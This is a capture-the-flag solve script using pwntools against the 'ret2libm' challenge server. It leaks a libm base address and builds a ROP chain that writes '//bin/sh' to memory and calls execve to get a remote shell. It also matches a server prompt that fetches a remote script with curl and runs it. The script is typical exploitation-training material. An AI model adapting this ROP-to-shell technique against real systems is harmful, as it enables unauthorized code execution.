#!/usr/bin/env python3


from pwn import *


e = ELF("./chal")
r = remote("ret2libm.chal.irisc.tf",10001)
r.recvuntil(b"<(curl -sSL https://goo.gle/kctf-pow) solve ")
value = r.recvline().strip()
p = process(["python3","../socat/pow.py","solve",value])
p.recvuntil(b"Solution: \n")
value = p.recvline().strip()
p.close()
r.sendline(value)
r.recvuntil(b"Check out my pecs: ")
libm_base = int(r.recvline().strip(),16) - 0x31cf0
pop_rdi = libm_base + 0xbc37
pop_rsi = libm_base + 0x289d3
pop_rdx = libm_base + 0x4c5c2 
pop_rax = libm_base + 0x1a3c8
syscall = libm_base + 0x3f39
write_gadget = libm_base + 0x805b8
write_address = libm_base + 0x39d168
second_part = p64(pop_rdi) + p64(write_address) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b)  + p64(syscall)
first_part = b"A" * 16 + p64(pop_rdx) + p64(0x68732f6e69622f2f) +  p64(pop_rax) + p64(0) + p64(pop_rsi) + p64(write_address - 8) + p64(write_gadget) + p64(0)
exploit = first_part + second_part
r.sendline(exploit)
r.interactive()
